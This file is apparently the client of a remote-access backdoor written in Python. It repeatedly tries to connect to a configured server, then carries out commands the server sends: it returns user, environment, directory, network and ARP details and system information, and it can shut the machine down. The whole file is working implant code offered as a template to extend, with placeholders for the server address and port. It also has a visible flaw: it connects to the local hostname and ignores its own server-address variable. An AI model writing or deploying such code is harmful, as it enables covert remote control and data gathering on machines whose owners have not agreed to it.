#Imports
import socket
import time
import random
import os
import subprocess
import datetime

#Variables
lHost = "" #Add a Server IP or "localhost" for local
port = 0 #Add a Connection Port

#Functions

def send(msg):
    s.send(msg.encode("UTF-8"))
  
def getInstructions():
    while True:
        msg = s.recv(4096)
        inst = msg.decode("UTF-8")
        
        #Add your instructions here:
        #I added some default ones
        
        if inst == "test":
            try:
                send("[OK]Test works!")
            except:
                pass
        elif inst == "whoami":
            try:
                send(subprocess.getoutput('whoami'))
            except:
                pass
        elif inst == "os":
            try:
                osname = os.name
                send("OS NAME: " + osname)
            except:
                pass
        elif inst == "pwd":
            try:
                cwd = os.getcwd()
                send("CURRENT WORKING DIRECTORY: " + cwd)
            except:
                pass
        elif inst == "getpid":
            try:
                pid = os.getpid()
                send("Real process ID of the current process: " + str(pid))
            except:
                pass
        elif inst == "SET":
            try:
                send(subprocess.getoutput('SET'))
            except:
                pass
        elif inst == "ls":
            try:
                send(subprocess.getoutput('ls'))
            except:
                pass
        elif inst == "ls all":
            try:
                send(subprocess.getoutput('ls -alh'))
            except:
                pass
        elif inst == "ipconfig":
            try:
                send(subprocess.getoutput('ipconfig'))
            except:
                pass
        elif inst == "arp":
            try:
                send(subprocess.getoutput('arp -a'))
            except:
                pass
        elif inst == "root dir":
            try:
                os.chdir("/")
                send("CHANGED TO ROOT FOLDER")
            except:
                pass
        elif inst == "systeminfo":
            try:
                send(subprocess.getoutput('systeminfo'))
            except:
                pass
        elif inst == "shutdown":
            try:
                send(subprocess.getoutput('shutdown /s'))
            except:
                pass
        else:
            send("COMMAND NOT FOUND")


#Connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1) #added for debugging
host = socket.gethostname()
connected = False
while connected == False:
    try:
        s.connect((host, port))
        connected = True
    except:
        sleepTime = random.randint(20, 30)
        time.sleep(sleepTime)
getInstructions()